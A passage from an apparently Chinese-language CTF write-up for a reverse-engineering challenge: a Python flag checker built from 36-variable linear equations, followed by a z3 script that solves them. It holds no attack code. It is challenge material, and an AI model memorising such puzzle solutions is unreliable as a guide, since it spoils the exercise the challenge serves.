    47 * flag[0] + 19 * flag[1] + 37 * flag[2] + 93 * flag[3] + 73 * flag[4] + 30 * flag[5] + 45 * flag[6] + 47 * flag[7] + 72 * flag[8] + 85 * flag[9] + 37 * flag[10] + 68 * flag[11] + 89 * flag[12] + 34 * flag[13] + 4 * flag[14] + 50 * flag[15] + 87 * flag[16] + 33 * flag[17] + 87 * flag[18] + 43 * flag[19] + 9 * flag[20] + 61 * flag[21] + 93 * flag[22] + 49 * flag[23] + 74 * flag[24] + 49 * flag[25] + 68 * flag[26] + 29 * flag[27] + 54 * flag[28] + 54 * flag[29] + 37 * flag[30] + 79 * flag[31] + 33 * flag[32] + 65 * flag[33] + 59 * flag[34] + 15 * flag[35] == 168472
    79 * flag[0] + 73 * flag[1] + 60 * flag[2] + 62 * flag[3] + 25 * flag[4] + 16 * flag[5] + 77 * flag[6] + 81 * flag[7] + 79 * flag[8] + 31 * flag[9] + 82 * flag[10] + 84 * flag[11] + 62 * flag[12] + 36 * flag[13] + 18 * flag[14] + 20 * flag[15] + 46 * flag[16] + 57 * flag[17] + 21 * flag[18] + 40 * flag[19] + 3 * flag[20] + 50 * flag[21] + 58 * flag[22] + 80 * flag[23] + 84 * flag[24] + 71 * flag[25] + 87 * flag[26] + 3 * flag[27] + 13 * flag[28] + 77 * flag[29] + 83 * flag[30] + 39 * flag[31] + 55 * flag[32] + 34 * flag[33] + 41 * flag[34] + 63 * flag[35] == 178706
            and 7 * flag[0] + 50 * flag[1] + 26 * flag[2] + 79 * flag[3] + 21 * flag[4] + 42 * flag[5] + 83 * flag[6] + 94 * flag[7] + 63 * flag[8] + 83 * flag[9] + 3 * flag[10] + 68 * flag[11] + 25 * flag[12] + 91 * flag[13] + 3 * flag[14] + 5 * flag[15] + 17 * flag[16] + 61 * flag[17] + 3 * flag[18] + 40 * flag[19] + 87 * flag[20] + 11 * flag[21] + 27 * flag[22] + 74 * flag[23] + 73 * flag[24] + 21 * flag[25] + 56 * flag[26] + 46 * flag[27] + 36 * flag[28] + 24 * flag[29] + 14 * flag[30] + 63 * flag[31] + 21 * flag[32] + 71 * flag[33] + 30 * flag[34] + 53 * flag[35] == 143852
            and 57 * flag[0] + 51 * flag[1] + 49 * flag[2] + 15 * flag[3] + 94 * flag[4] + 34 * flag[5] + 27 * flag[6] + 5 * flag[7] + 100 * flag[8] + 68 * flag[9] + 67 * flag[10] + 81 * flag[11] + 10 * flag[12] + 5 * flag[13] + 85 * flag[14] + 70 * flag[15] + 80 * flag[16] + 20 * flag[17] + 89 * flag[18] + 30 * flag[19] + 84 * flag[20] + 35 * flag[21] + 41 * flag[22] + 87 * flag[23] + 75 * flag[24] + 67 * flag[25] + 20 * flag[26] + 33 * flag[27] + 29 * flag[28] + 6 * flag[29] + 97 * flag[30] + 25 * flag[31] + 10 * flag[32] + 18 * flag[33] + 23 * flag[34] + 30 * flag[35] == 154052
            and 97 * flag[0] + 93 * flag[1] + 10 * flag[2] + 44 * flag[3] + 28 * flag[4] + 22 * flag[5] + 17 * flag[6] + 41 * flag[7] + 47 * flag[8] + 62 * flag[9] + 42 * flag[10] + 47 * flag[11] + 61 * flag[12] + 32 * flag[13] + 31 * flag[14] + 52 * flag[15] + 47 * flag[16] + 92 * flag[17] + 42 * flag[18] + 37 * flag[19] + 7 * flag[20] + 40 * flag[21] + 48 * flag[22] + 40 * flag[23] + 11 * flag[24] + 96 * flag[25] + 51 * flag[26] + 42 * flag[27] + 66 * flag[28] + 8 * flag[29] + 89 * flag[30] + 64 * flag[31] + 30 * flag[32] + 11 * flag[33] + 8 * flag[34] + 83 * flag[35] == 147899
            and 51 * flag[0] + 94 * flag[1] + 58 * flag[2] + 76 * flag[3] + 21 * flag[4] + 10 * flag[5] + 75 * flag[6] + 4 * flag[7] + 55 * flag[8] + 37 * flag[9] + 71 * flag[10] + 97 * flag[11] + 27 * flag[12] + 93 * flag[13] + 82 * flag[14] + 94 * flag[15] + 38 * flag[16] + 69 * flag[17] + 36 * flag[18] + 58 * flag[19] + 93 * flag[20] + 18 * flag[21] + 54 * flag[22] + 59 * flag[23] + 12 * flag[24] + 12 * flag[25] + 54 * flag[26] + 83 * flag[27] + 73 * flag[28] + 83 * flag[29] + 33 * flag[30] + 12 * flag[31] + 78 * flag[32] + 38 * flag[33] + 45 * flag[34] + 57 * flag[35] == 176754
            and 78 * flag[0] + 29 * flag[1] + 8 * flag[2] + 47 * flag[3] + 48 * flag[4] + 88 * flag[5] + 18 * flag[6] + 88 * flag[7] + 50 * flag[8] + 58 * flag[9] + 36 * flag[10] + 88 * flag[11] + 9 * flag[12] + 74 * flag[13] + 85 * flag[14] + 5 * flag[15] + 91 * flag[16] + 58 * flag[17] + 85 * flag[18] + 46 * flag[19] + 89 * flag[20] + 76 * flag[21] + 61 * flag[22] + 6 * flag[23] + 61 * flag[24] + 78 * flag[25] + 4 * flag[26] + 48 * flag[27] + 50 * flag[28] + 69 * flag[29] + 23 * flag[30] + 70 * flag[31] + 23 * flag[32] + 15 * flag[33] + 22 * flag[34] + 68 * flag[35] == 171970
            and 75 * flag[0] + 2 * flag[1] + 94 * flag[2] + 97 * flag[3] + 72 * flag[4] + 62 * flag[5] + 78 * flag[6] + 42 * flag[7] + 69 * flag[8] + 11 * flag[9] + 37 * flag[10] + 3 * flag[11] + 29 * flag[12] + 15 * flag[13] + 39 * flag[14] + 33 * flag[15] + 18 * flag[16] + 33 * flag[17] + 12 * flag[18] + 64 * flag[19] + 6 * flag[20] + 18 * flag[21] + 34 * flag[22] + 15 * flag[23] + 3 * flag[24] + 100 * flag[25] + 85 * flag[26] + 32 * flag[27] + 97 * flag[28] + 93 * flag[29] + 84 * flag[30] + 73 * flag[31] + 26 * flag[32] + 31 * flag[33] + 71 * flag[34] + 97 * flag[35] == 166497
            and 59 * flag[0] + 26 * flag[1] + 48 * flag[2] + 86 * flag[3] + 58 * flag[4] + 70 * flag[5] + 61 * flag[6] + 100 * flag[7] + 63 * flag[8] + 74 * flag[9] + 26 * flag[10] + 38 * flag[11] + 24 * flag[12] + 45 * flag[13] + 52 * flag[14] + 32 * flag[15] + 91 * flag[16] + 89 * flag[17] + 19 * flag[18] + 59 * flag[19] + 87 * flag[20] + 5 * flag[21] + 15 * flag[22] + 68 * flag[23] + 72 * flag[24] + 67 * flag[25] + 2 * flag[26] + 65 * flag[27] + 46 * flag[28] + 10 * flag[29] + 33 * flag[30] + 79 * flag[31] + 11 * flag[32] + 16 * flag[33] + 73 * flag[34] + 53 * flag[35] == 173887
            and 6 * flag[0] + 66 * flag[1] + 59 * flag[2] + 76 * flag[3] + 86 * flag[4] + 20 * flag[5] + 59 * flag[6] + 34 * flag[7] + 28 * flag[8] + 48 * flag[9] + 86 * flag[10] + 5 * flag[11] + 87 * flag[12] + 13 * flag[13] + 95 * flag[14] + 87 * flag[15] + 65 * flag[16] + 35 * flag[17] + 58 * flag[18] + 10 * flag[19] + 98 * flag[20] + 100 * flag[21] + 4 * flag[22] + 78 * flag[23] + 66 * flag[24] + 57 * flag[25] + 34 * flag[26] + 86 * flag[27] + 62 * flag[28] + 36 * flag[29] + 92 * flag[30] + 28 * flag[31] + 3 * flag[32] + 24 * flag[33] + 49 * flag[34] + 28 * flag[35] == 173189
            and 25 * flag[0] + 48 * flag[1] + 44 * flag[2] + 16 * flag[3] + 99 * flag[4] + 100 * flag[5] + 69 * flag[6] + 26 * flag[7] + 65 * flag[8] + 32 * flag[9] + 18 * flag[10] + 65 * flag[11] + 58 * flag[12] + 72 * flag[13] + 61 * flag[14] + 56 * flag[15] + 10 * flag[16] + 78 * flag[17] + 93 * flag[18] + 98 * flag[19] + 39 * flag[20] + 43 * flag[21] + 87 * flag[22] + 12 * flag[23] + 42 * flag[24] + 100 * flag[25] + 100 * flag[26] + 47 * flag[27] + 31 * flag[28] + 51 * flag[29] + 75 * flag[30] + 10 * flag[31] + 63 * flag[32] + 48 * flag[33] + 22 * flag[34] + 87 * flag[35] == 174138
            and 61 * flag[0] + 13 * flag[1] + 100 * flag[2] + 59 * flag[3] + 31 * flag[4] + 9 * flag[5] + 28 * flag[6] + 7 * flag[7] + 27 * flag[8] + 63 * flag[9] + 11 * flag[10] + 57 * flag[11] + 95 * flag[12] + 79 * flag[13] + 21 * flag[14] + 30 * flag[15] + 60 * flag[16] + 81 * flag[17] + 43 * flag[18] + 32 * flag[19] + 30 * flag[20] + 34 * flag[21] + 80 * flag[22] + 53 * flag[23] + 28 * flag[24] + 39 * flag[25] + 74 * flag[26] + 21 * flag[27] + 18 * flag[28] + 92 * flag[29] + 73 * flag[30] + 60 * flag[31] + 21 * flag[32] + 69 * flag[33] + 76 * flag[34] + 84 * flag[35] == 157623
            and 22 * flag[0] + 62 * flag[1] + 61 * flag[2] + 20 * flag[3] + 66 * flag[4] + 2 * flag[5] + 11 * flag[6] + 82 * flag[7] + 93 * flag[8] + 13 * flag[9] + 69 * flag[10] + 37 * flag[11] + 92 * flag[12] + 80 * flag[13] + 66 * flag[14] + 47 * flag[15] + 28 * flag[16] + 14 * flag[17] + 62 * flag[18] + 56 * flag[19] + 89 * flag[20] + 29 * flag[21] + 39 * flag[22] + 38 * flag[23] + 46 * flag[24] + 10 * flag[25] + 6 * flag[26] + 82 * flag[27] + 77 * flag[28] + 78 * flag[29] + 45 * flag[30] + 50 * flag[31] + 5 * flag[32] + 73 * flag[33] + 17 * flag[34] + 65 * flag[35] == 154943
            and 5 * flag[0] + 84 * flag[1] + 83 * flag[2] + 77 * flag[3] + 76 * flag[4] + 60 * flag[5] + 20 * flag[6] + 48 * flag[7] + 53 * flag[8] + 14 * flag[9] + 98 * flag[10] + 50 * flag[11] + 37 * flag[12] + 15 * flag[13] + 31 * flag[14] + 69 * flag[15] + 55 * flag[16] + 37 * flag[17] + 64 * flag[18] + 35 * flag[19] + 26 * flag[20] + 20 * flag[21] + 18 * flag[22] + 67 * flag[23] + 50 * flag[24] + 57 * flag[25] + 60 * flag[26] + 71 * flag[27] + 4 * flag[28] + 35 * flag[29] + 23 * flag[30] + 52 * flag[31] + 11 * flag[32] + 15 * flag[33] + 83 * flag[34] + 51 * flag[35] == 156078
            and 33 * flag[0] + 47 * flag[1] + 89 * flag[2] + 52 * flag[3] + 89 * flag[4] + 55 * flag[5] + 98 * flag[6] + 28 * flag[7] + 48 * flag[8] + 90 * flag[9] + 69 * flag[10] + 29 * flag[11] + 68 * flag[12] + 24 * flag[13] + 19 * flag[14] + 18 * flag[15] + 44 * flag[16] + 27 * flag[17] + 14 * flag[18] + 64 * flag[19] + 15 * flag[20] + 31 * flag[21] + 23 * flag[22] + 2 * flag[23] + 36 * flag[24] + 45 * flag[25] + 37 * flag[26] + 71 * flag[27] + 61 * flag[28] + 92 * flag[29] + 28 * flag[30] + 64 * flag[31] + 13 * flag[32] + 66 * flag[33] + 98 * flag[34] + 3 * flag[35] == 156158
            and 80 * flag[0] + 88 * flag[1] + 68 * flag[2] + 66 * flag[3] + 46 * flag[4] + 75 * flag[5] + 32 * flag[6] + 19 * flag[7] + 36 * flag[8] + 83 * flag[9] + 63 * flag[10] + 86 * flag[11] + 79 * flag[12] + 30 * flag[13] + 61 * flag[14] + 50 * flag[15] + 100 * flag[16] + 52 * flag[17] + 66 * flag[18] + 30 * flag[19] + 20 * flag[20] + 97 * flag[21] + 45 * flag[22] + 46 * flag[23] + 38 * flag[24] + 21 * flag[25] + 32 * flag[26] + 79 * flag[27] + 68 * flag[28] + 43 * flag[29] + 65 * flag[30] + 47 * flag[31] + 86 * flag[32] + 30 * flag[33] + 74 * flag[34] + 18 * flag[35] == 181770
            and 11 * flag[0] + 58 * flag[1] + 95 * flag[2] + 67 * flag[3] + 96 * flag[4] + 74 * flag[5] + 60 * flag[6] + 11 * flag[7] + 21 * flag[8] + 14 * flag[9] + 100 * flag[10] + 60 * flag[11] + 70 * flag[12] + 92 * flag[13] + 92 * flag[14] + 39 * flag[15] + 43 * flag[16] + 52 * flag[17] + 5 * flag[18] + 22 * flag[19] + 90 * flag[20] + 70 * flag[21] + 12 * flag[22] + 52 * flag[23] + 36 * flag[24] + 21 * flag[25] + 45 * flag[26] + 59 * flag[27] + 74 * flag[28] + 46 * flag[29] + 11 * flag[30] + 60 * flag[31] + 8 * flag[32] + 52 * flag[33] + 14 * flag[34] + 77 * flag[35] == 173577
            and 57 * flag[0] + 37 * flag[1] + 94 * flag[2] + 43 * flag[3] + 53 * flag[4] + 55 * flag[5] + 7 * flag[6] + 83 * flag[7] + 91 * flag[8] + 61 * flag[9] + 86 * flag[10] + 6 * flag[11] + 44 * flag[12] + 87 * flag[13] + 61 * flag[14] + 92 * flag[15] + 24 * flag[16] + 74 * flag[17] + 100 * flag[18] + 22 * flag[19] + 12 * flag[20] + 68 * flag[21] + 19 * flag[22] + 88 * flag[23] + 81 * flag[24] + 83 * flag[25] + 70 * flag[26] + 39 * flag[27] + 30 * flag[28] + 82 * flag[29] + 30 * flag[30] + 35 * flag[31] + 55 * flag[32] + 18 * flag[33] + 27 * flag[34] + 80 * flag[35] == 180922
            and 80 * flag[0] + 14 * flag[1] + 5 * flag[2] + 89 * flag[3] + 71 * flag[4] + 82 * flag[5] + 44 * flag[6] + 8 * flag[7] + 33 * flag[8] + 26 * flag[9] + 77 * flag[10] + 49 * flag[11] + 36 * flag[12] + 90 * flag[13] + 73 * flag[14] + 71 * flag[15] + 66 * flag[16] + 4 * flag[17] + 37 * flag[18] + 78 * flag[19] + 38 * flag[20] + 18 * flag[21] + 15 * flag[22] + 79 * flag[23] + 6 * flag[24] + 74 * flag[25] + 18 * flag[26] + 85 * flag[27] + 56 * flag[28] + 53 * flag[29] + 90 * flag[30] + 75 * flag[31] + 52 * flag[32] + 2 * flag[33] + 13 * flag[34] + 54 * flag[35] == 158596
            and 96 * flag[0] + 29 * flag[1] + 37 * flag[2] + 70 * flag[3] + 92 * flag[4] + 80 * flag[5] + 24 * flag[6] + 36 * flag[7] + 32 * flag[8] + 29 * flag[9] + 78 * flag[10] + 45 * flag[11] + 58 * flag[12] + 55 * flag[13] + 16 * flag[14] + 92 * flag[15] + 71 * flag[16] + 82 * flag[17] + 86 * flag[18] + 23 * flag[19] + 4 * flag[20] + 58 * flag[21] + 16 * flag[22] + 18 * flag[23] + 38 * flag[24] + 53 * flag[25] + 82 * flag[26] + 76 * flag[27] + 83 * flag[28] + 73 * flag[29] + 87 * flag[30] + 36 * flag[31] + 61 * flag[32] + 85 * flag[33] + 61 * flag[34] + 69 * flag[35] == 181072
            and 14 * flag[0] + 71 * flag[1] + 53 * flag[2] + 46 * flag[3] + 59 * flag[4] + 53 * flag[5] + 22 * flag[6] + 69 * flag[7] + 67 * flag[8] + 43 * flag[9] + 23 * flag[10] + 14 * flag[11] + 77 * flag[12] + 95 * flag[13] + 19 * flag[14] + 83 * flag[15] + 79 * flag[16] + 41 * flag[17] + 12 * flag[18] + 53 * flag[19] + 3 * flag[20] + 4 * flag[21] + 65 * flag[22] + 92 * flag[23] + 64 * flag[24] + 52 * flag[25] + 3 * flag[26] + 59 * flag[27] + 89 * flag[28] + 75 * flag[29] + 12 * flag[30] + 46 * flag[31] + 61 * flag[32] + 53 * flag[33] + 97 * flag[34] + 43 * flag[35] == 163777
            and 57 * flag[0] + 99 * flag[1] + 49 * flag[2] + 100 * flag[3] + 68 * flag[4] + 99 * flag[5] + 26 * flag[6] + 65 * flag[7] + 47 * flag[8] + 65 * flag[9] + 90 * flag[10] + 68 * flag[11] + 84 * flag[12] + 4 * flag[13] + 9 * flag[14] + 43 * flag[15] + 88 * flag[16] + 33 * flag[17] + 48 * flag[18] + 88 * flag[19] + 37 * flag[20] + 31 * flag[21] + 21 * flag[22] + 94 * flag[23] + 22 * flag[24] + 93 * flag[25] + 70 * flag[26] + 14 * flag[27] + 13 * flag[28] + 28 * flag[29] + 83 * flag[30] + 12 * flag[31] + 80 * flag[32] + 58 * flag[33] + 43 * flag[34] + 97 * flag[35] == 187620
            and 33 * flag[0] + 94 * flag[1] + 56 * flag[2] + 48 * flag[3] + 13 * flag[4] + 44 * flag[5] + 81 * flag[6] + 42 * flag[7] + 19 * flag[8] + 96 * flag[9] + 67 * flag[10] + 79 * flag[11] + 12 * flag[12] + 67 * flag[13] + 34 * flag[14] + 72 * flag[15] + 45 * flag[16] + 48 * flag[17] + 24 * flag[18] + 71 * flag[19] + 65 * flag[20] + 13 * flag[21] + 32 * flag[22] + 97 * flag[23] + 48 * flag[24] + 42 * flag[25] + 65 * flag[26] + 95 * flag[27] + 54 * flag[28] + 9 * flag[29] + 35 * flag[30] + 57 * flag[31] + 18 * flag[32] + 20 * flag[33] + 83 * flag[34] + 76 * flag[35] == 169266
            and 31 * flag[0] + 38 * flag[1] + 83 * flag[2] + 45 * flag[3] + 28 * flag[4] + 97 * flag[5] + 54 * flag[6] + 11 * flag[7] + 80 * flag[8] + 45 * flag[9] + 92 * flag[10] + 13 * flag[11] + 52 * flag[12] + 94 * flag[13] + 51 * flag[14] + 30 * flag[15] + 11 * flag[16] + 61 * flag[17] + 46 * flag[18] + 10 * flag[19] + 28 * flag[20] + 72 * flag[21] + 20 * flag[22] + 95 * flag[23] + 90 * flag[24] + 39 * flag[25] + 32 * flag[26] + 95 * flag[27] + 19 * flag[28] + 3 * flag[29] + 65 * flag[30] + 71 * flag[31] + 73 * flag[32] + 80 * flag[33] + 23 * flag[34] + 71 * flag[35] == 162587
            and 9 * flag[0] + 81 * flag[1] + 80 * flag[2] + 37 * flag[3] + 96 * flag[4] + 72 * flag[5] + 95 * flag[6] + 93 * flag[7] + 26 * flag[8] + 98 * flag[9] + 50 * flag[10] + 79 * flag[11] + 57 * flag[12] + 13 * flag[13] + 49 * flag[14] + 96 * flag[15] + 82 * flag[16] + 84 * flag[17] + 89 * flag[18] + 40 * flag[19] + 38 * flag[20] + 66 * flag[21] + 81 * flag[22] + 81 * flag[23] + 79 * flag[24] + 77 * flag[25] + 86 * flag[26] + 68 * flag[27] + 26 * flag[28] + 37 * flag[29] + 15 * flag[30] + 56 * flag[31] + 13 * flag[32] + 17 * flag[33] + 50 * flag[34] + 37 * flag[35] == 198705
            and 82 * flag[0] + 57 * flag[1] + 33 * flag[2] + 32 * flag[3] + 79 * flag[4] + 25 * flag[5] + 54 * flag[6] + 27 * flag[7] + 50 * flag[8] + 14 * flag[9] + 72 * flag[10] + 31 * flag[11] + 28 * flag[12] + 66 * flag[13] + 4 * flag[14] + 6 * flag[15] + 48 * flag[16] + 34 * flag[17] + 63 * flag[18] + 51 * flag[19] + 12 * flag[20] + 21 * flag[21] + 73 * flag[22] + 66 * flag[23] + 53 * flag[24] + 38 * flag[25] + 54 * flag[26] + 59 * flag[27] + 76 * flag[28] + 63 * flag[29] + 61 * flag[30] + 30 * flag[31] + 84 * flag[32] + 80 * flag[33] + 98 * flag[34] + 46 * flag[35] == 160349
            and 69 * flag[0] + 15 * flag[1] + 23 * flag[2] + 8 * flag[3] + 46 * flag[4] + 55 * flag[5] + 21 * flag[6] + 91 * flag[7] + 37 * flag[8] + 9 * flag[9] + 61 * flag[10] + 20 * flag[11] + 23 * flag[12] + 96 * flag[13] + 28 * flag[14] + 67 * flag[15] + 19 * flag[16] + 50 * flag[17] + 18 * flag[18] + 71 * flag[19] + 30 * flag[20] + 14 * flag[21] + 10 * flag[22] + 24 * flag[23] + 100 * flag[24] + 15 * flag[25] + 91 * flag[26] + 15 * flag[27] + 93 * flag[28] + 24 * flag[29] + 46 * flag[30] + 61 * flag[31] + 67 * flag[32] + 60 * flag[33] + 56 * flag[34] + 81 * flag[35] == 148095):
        return True
    return False


def main():
    flag = str(input('Input your flag: ')).encode()
    res = check(flag)
    if res:
        print('Right flag!')
        return None
    print('Wrong flag!')

if __name__ == '__main__':
    main()
    return None

```

z3解掉就好

```
from z3 import *


def solve_flag():
    # 创建36个整数变量，每个代表flag中的一个字符
    flag = [Int('flag_%d' % i) for i in range(36)]

    s = Solver()

    # 添加ASCII字符约束（可打印字符）
    for i in range(36):
        s.add(flag[i] >= 32, flag[i] <= 126)

    # 添加所有方程约束
    s.add(47 * flag[0] + 41 * flag[1] + 32 * flag[2] + 56 * flag[3] + 52 * flag[4] + 67 * flag[5] + 13 * flag[6] + 25 *
          flag[7] + 20 * flag[8] + 98 * flag[9] + 88 * flag[10] + 65 * flag[11] + 82 * flag[12] + 92 * flag[13] + 3 *
          flag[14] + 29 * flag[15] + 93 * flag[16] + 88 * flag[17] + 45 * flag[18] + 58 * flag[19] + 40 * flag[
              20] + 72 * flag[21] + 99 * flag[22] + 10 * flag[23] + 94 * flag[24] + 62 * flag[25] + 82 * flag[26] + 92 *
          flag[27] + 23 * flag[28] + 46 * flag[29] + 55 * flag[30] + 72 * flag[31] + 44 * flag[32] + 9 * flag[33] + 65 *
          flag[34] + 42 * flag[35] == 176386)
    s.add(10 * flag[0] + 98 * flag[1] + 5 * flag[2] + 28 * flag[3] + 68 * flag[4] + 20 * flag[5] + 2 * flag[6] + 22 *
          flag[7] + 65 * flag[8] + 44 * flag[9] + 85 * flag[10] + 97 * flag[11] + 33 * flag[12] + 74 * flag[13] + 93 *
          flag[14] + 74 * flag[15] + 41 * flag[16] + 65 * flag[17] + 32 * flag[18] + 93 * flag[19] + 22 * flag[
              20] + 69 * flag[21] + 68 * flag[22] + 57 * flag[23] + 47 * flag[24] + 29 * flag[25] + 74 * flag[26] + 54 *
          flag[27] + 91 * flag[28] + 90 * flag[29] + 26 * flag[30] + 11 * flag[31] + 89 * flag[32] + 57 * flag[
              33] + 100 * flag[34] + 95 * flag[35] == 186050)
    s.add(
        25 * flag[0] + 22 * flag[1] + 54 * flag[2] + 5 * flag[3] + 8 * flag[4] + 3 * flag[5] + 12 * flag[6] + 70 * flag[
            7] + 25 * flag[8] + 61 * flag[9] + 68 * flag[10] + 12 * flag[11] + 27 * flag[12] + 42 * flag[13] + 83 *
        flag[14] + 91 * flag[15] + 67 * flag[16] + 46 * flag[17] + 8 * flag[18] + 45 * flag[19] + 94 * flag[20] + 80 *
        flag[21] + 69 * flag[22] + 95 * flag[23] + 12 * flag[24] + 21 * flag[25] + 94 * flag[26] + 82 * flag[27] + 93 *
        flag[28] + 41 * flag[29] + 4 * flag[30] + 56 * flag[31] + 92 * flag[32] + 77 * flag[33] + 15 * flag[34] + 30 *
        flag[35] == 154690)
    s.add(33 * flag[0] + 49 * flag[1] + 56 * flag[2] + 40 * flag[3] + 90 * flag[4] + 59 * flag[5] + 82 * flag[6] + 6 *
          flag[7] + 81 * flag[8] + 32 * flag[9] + 23 * flag[10] + 76 * flag[11] + 93 * flag[12] + 83 * flag[13] + 10 *
          flag[14] + 44 * flag[15] + 58 * flag[16] + 33 * flag[17] + 79 * flag[18] + 77 * flag[19] + 82 * flag[
              20] + 56 * flag[21] + 70 * flag[22] + 34 * flag[23] + 45 * flag[24] + 76 * flag[25] + 57 * flag[26] + 43 *
          flag[27] + 100 * flag[28] + 19 * flag[29] + 11 * flag[30] + 90 * flag[31] + 3 * flag[32] + 60 * flag[
              33] + 57 * flag[34] + 23 * flag[35] == 172116)
    s.add(65 * flag[0] + 70 * flag[1] + 20 * flag[2] + 32 * flag[3] + 75 * flag[4] + 30 * flag[5] + 3 * flag[6] + 78 *
          flag[7] + 35 * flag[8] + 45 * flag[9] + 95 * flag[10] + 93 * flag[11] + 52 * flag[12] + 32 * flag[13] + 88 *
          flag[14] + 94 * flag[15] + 67 * flag[16] + 34 * flag[17] + 91 * flag[18] + 88 * flag[19] + 31 * flag[
              20] + 61 * flag[21] + 17 * flag[22] + 99 * flag[23] + 100 * flag[24] + 49 * flag[25] + 4 * flag[26] + 60 *
          flag[27] + 81 * flag[28] + 88 * flag[29] + 43 * flag[30] + 34 * flag[31] + 30 * flag[32] + 52 * flag[
              33] + 18 * flag[34] + 100 * flag[35] == 190544)
    s.add(81 * flag[0] + 42 * flag[1] + 28 * flag[2] + 98 * flag[3] + 31 * flag[4] + 46 * flag[5] + 64 * flag[6] + 15 *
          flag[7] + 49 * flag[8] + 13 * flag[9] + 100 * flag[10] + 81 * flag[11] + 32 * flag[12] + 52 * flag[13] + 59 *
          flag[14] + 24 * flag[15] + 94 * flag[16] + 32 * flag[17] + 93 * flag[18] + 32 * flag[19] + 13 * flag[
              20] + 89 * flag[21] + 37 * flag[22] + 30 * flag[23] + 78 * flag[24] + 81 * flag[25] + 9 * flag[26] + 45 *
          flag[27] + 93 * flag[28] + 100 * flag[29] + 97 * flag[30] + 10 * flag[31] + 80 * flag[32] + 54 * flag[
              33] + 88 * flag[34] + 85 * flag[35] == 190323)
    s.add(76 * flag[0] + 54 * flag[1] + 5 * flag[2] + 14 * flag[3] + 62 * flag[4] + 44 * flag[5] + 24 * flag[6] + 29 *
          flag[7] + 85 * flag[8] + 87 * flag[9] + 19 * flag[10] + 3 * flag[11] + 65 * flag[12] + 24 * flag[13] + 92 *
          flag[14] + 37 * flag[15] + 57 * flag[16] + 20 * flag[17] + 45 * flag[18] + 5 * flag[19] + 13 * flag[20] + 91 *
          flag[21] + 92 * flag[22] + 75 * flag[23] + 36 * flag[24] + 79 * flag[25] + 12 * flag[26] + 22 * flag[
              27] + 75 * flag[28] + 82 * flag[29] + 28 * flag[30] + 82 * flag[31] + 24 * flag[32] + 53 * flag[33] + 56 *
          flag[34] + 92 * flag[35] == 162017)
    s.add(53 * flag[0] + 52 * flag[1] + 72 * flag[2] + 23 * flag[3] + 26 * flag[4] + 13 * flag[5] + 62 * flag[6] + 96 *
          flag[7] + 67 * flag[8] + 96 * flag[9] + 66 * flag[10] + 41 * flag[11] + 5 * flag[12] + 18 * flag[13] + 37 *
          flag[14] + 13 * flag[15] + 61 * flag[16] + 71 * flag[17] + 91 * flag[18] + 96 * flag[19] + 56 * flag[20] + 3 *
          flag[21] + 65 * flag[22] + 14 * flag[23] + 57 * flag[24] + 69 * flag[25] + 75 * flag[26] + 68 * flag[
              27] + 10 * flag[28] + 60 * flag[29] + 62 * flag[30] + 95 * flag[31] + 53 * flag[32] + 19 * flag[33] + 7 *
          flag[34] + 56 * flag[35] == 165118)
    s.add(26 * flag[0] + 7 * flag[1] + 49 * flag[2] + 14 * flag[3] + 36 * flag[4] + 87 * flag[5] + 21 * flag[6] + 35 *
          flag[7] + 15 * flag[8] + 91 * flag[9] + 15 * flag[10] + 100 * flag[11] + 8 * flag[12] + 32 * flag[13] + 100 *
          flag[14] + 35 * flag[15] + 66 * flag[16] + 3 * flag[17] + 79 * flag[18] + 96 * flag[19] + 82 * flag[20] + 95 *
          flag[21] + 68 * flag[22] + 13 * flag[23] + 86 * flag[24] + 51 * flag[25] + 24 * flag[26] + 76 * flag[
              27] + 30 * flag[28] + 60 * flag[29] + 29 * flag[30] + 70 * flag[31] + 40 * flag[32] + 90 * flag[33] + 44 *
          flag[34] + 3 * flag[35] == 153332)
    s.add(47 * flag[0] + 19 * flag[1] + 37 * flag[2] + 93 * flag[3] + 73 * flag[4] + 30 * flag[5] + 45 * flag[6] + 47 *
          flag[7] + 72 * flag[8] + 85 * flag[9] + 37 * flag[10] + 68 * flag[11] + 89 * flag[12] + 34 * flag[13] + 4 *
          flag[14] + 50 * flag[15] + 87 * flag[16] + 33 * flag[17] + 87 * flag[18] + 43 * flag[19] + 9 * flag[20] + 61 *
          flag[21] + 93 * flag[22] + 49 * flag[23] + 74 * flag[24] + 49 * flag[25] + 68 * flag[26] + 29 * flag[
              27] + 54 * flag[28] + 54 * flag[29] + 37 * flag[30] + 79 * flag[31] + 33 * flag[32] + 65 * flag[33] + 59 *
          flag[34] + 15 * flag[35] == 168472)
    s.add(79 * flag[0] + 73 * flag[1] + 60 * flag[2] + 62 * flag[3] + 25 * flag[4] + 16 * flag[5] + 77 * flag[6] + 81 *
          flag[7] + 79 * flag[8] + 31 * flag[9] + 82 * flag[10] + 84 * flag[11] + 62 * flag[12] + 36 * flag[13] + 18 *
          flag[14] + 20 * flag[15] + 46 * flag[16] + 57 * flag[17] + 21 * flag[18] + 40 * flag[19] + 3 * flag[20] + 50 *
          flag[21] + 58 * flag[22] + 80 * flag[23] + 84 * flag[24] + 71 * flag[25] + 87 * flag[26] + 3 * flag[27] + 13 *
          flag[28] + 77 * flag[29] + 83 * flag[30] + 39 * flag[31] + 55 * flag[32] + 34 * flag[33] + 41 * flag[
              34] + 63 * flag[35] == 178706)
    s.add(7 * flag[0] + 50 * flag[1] + 26 * flag[2] + 79 * flag[3] + 21 * flag[4] + 42 * flag[5] + 83 * flag[6] + 94 *
          flag[7] + 63 * flag[8] + 83 * flag[9] + 3 * flag[10] + 68 * flag[11] + 25 * flag[12] + 91 * flag[13] + 3 *
          flag[14] + 5 * flag[15] + 17 * flag[16] + 61 * flag[17] + 3 * flag[18] + 40 * flag[19] + 87 * flag[20] + 11 *
          flag[21] + 27 * flag[22] + 74 * flag[23] + 73 * flag[24] + 21 * flag[25] + 56 * flag[26] + 46 * flag[
              27] + 36 * flag[28] + 24 * flag[29] + 14 * flag[30] + 63 * flag[31] + 21 * flag[32] + 71 * flag[33] + 30 *
          flag[34] + 53 * flag[35] == 143852)
    s.add(57 * flag[0] + 51 * flag[1] + 49 * flag[2] + 15 * flag[3] + 94 * flag[4] + 34 * flag[5] + 27 * flag[6] + 5 *
          flag[7] + 100 * flag[8] + 68 * flag[9] + 67 * flag[10] + 81 * flag[11] + 10 * flag[12] + 5 * flag[13] + 85 *
          flag[14] + 70 * flag[15] + 80 * flag[16] + 20 * flag[17] + 89 * flag[18] + 30 * flag[19] + 84 * flag[
              20] + 35 * flag[21] + 41 * flag[22] + 87 * flag[23] + 75 * flag[24] + 67 * flag[25] + 20 * flag[26] + 33 *
